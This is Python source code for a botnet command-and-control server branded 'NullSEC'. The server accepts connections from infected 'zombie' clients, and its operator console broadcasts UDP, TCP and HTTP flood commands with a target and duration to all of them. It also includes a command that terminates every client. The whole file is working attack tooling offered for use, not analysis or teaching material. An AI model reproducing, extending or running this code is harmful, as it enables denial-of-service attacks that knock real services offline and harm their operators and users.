import socket, threading, os, re

clients_lock = threading.Lock()
clients = []

# used for printing connected clients
def update_client_count():
    with clients_lock:
        print(f"\nConnected clients: {len(clients)}")

def handle_client(client_socket, client_address):
    global clients

    ip, _ = client_address
    with clients_lock:
        if any(client[1] == ip for client in clients):
            client_socket.close()
            return
        clients.append((client_socket, ip))

    update_client_count()

    try:
        while True:
            response = client_socket.recv(1024)
            if not response:
                break
            print(f"{response.decode('utf-8')}")
    except Exception as e:
        print(f"\nConnection lost: {e}")

    with clients_lock:
        clients = [(sock, client_ip) for sock, client_ip in clients if client_ip != ip]
    client_socket.close()
    update_client_count()

# This is for broadcasting commands to all clients (SENSATIVE DO NOT BREAK)
def broadcast_command(command):
    with clients_lock:
        for client_socket, _ in clients:
            try:
                client_socket.sendall(command.encode("utf-8"))
            except Exception as e:
                print(f"Failed to send command to client: {e}")

# sets up the server port and protocol
def start_server(server_ip, server_port):
    global server_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((server_ip, server_port))
    server_socket.listen(5)

    print(f"Server started on {server_ip}:{server_port}")

    while True:
        client_socket, client_address = server_socket.accept()
        thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        thread.start()

# DO NOT MODIFY, THIS IS FOR YOUR SECURITY
def is_valid_command(command):
    udp_pattern = r"^udp\s+\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s+\d+\s+\d+(\.\d+)?$"
    tcp_pattern = r"^tcp\s+\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s+\d+\s+\d+(\.\d+)?$"
    http_pattern = r"^http\s+https?://\S+\s+\d+(\.\d+)?$"

    return re.match(udp_pattern, command) or re.match(tcp_pattern, command) or re.match(http_pattern, command)

def display_help():
    print("Commands:")
    print("udp <IP Address> <port> <duration>")
    print("tcp <IP Address> <port> <duration>")
    print("http <url> <duration>")
    print("kill all (kills all connected zombies)")
    print("exit")
    print("clear")
    

def clear_screen():
    os.system("clear")

def display_banner():
    print("""
                            )               )             
             ( /(      (  (  ( /(      *   )  
             )\())  (  )\ )\ )\())(  ` )  /(  
            ((_)\  ))\((_|(_|(_)\ )\  ( )(_)) 
             _((_)/((_)_  _  _((_|(_)(_(_())  
            | \| (_))(| || || \| | __|_   _|  
            | .` | || | || || .` | _|  | |    
            |_|\_|\_,_|_||_||_|\_|___| |_|    
                                              
           ----> Developed with love by <----
                 ----> NullSEC <----
    """)

def main():
    server_ip = "CHANGE THIS" # change this to the C2 IP Address
    server_port = 4242 # Change this to the C2 Port

    server_thread = threading.Thread(target=start_server, args=(server_ip, server_port))
    server_thread.start()

# Very ugly if else statements, to lazy to fix so deal with it
    while True:
        try:
            command = input("Enter command: ").strip().lower()
            global server_socket
            if command == "exit":
                server_socket.close()
                print("Server shutting down gracefully, CTRL+C to exit")
                break
            elif command in ["help", "?"]:
                clear_screen()
                display_banner()
                display_help()
            elif is_valid_command(command):
                broadcast_command(command)
                clear_screen()
                display_banner()
                print("Attack sent!")
            elif command == "kill all":
                broadcast_command("terminate")
                print("Terminate command sent to all clients!")
            elif command.lower() == "clear":
                clear_screen()
                display_banner()
            else:
                print("Invalid command format. Type 'help' or '?' for assistance.")
        except Exception as e:
            print(f"Error: {e}")


if __name__ == "__main__":
    clear_screen()
    display_banner()
    main()

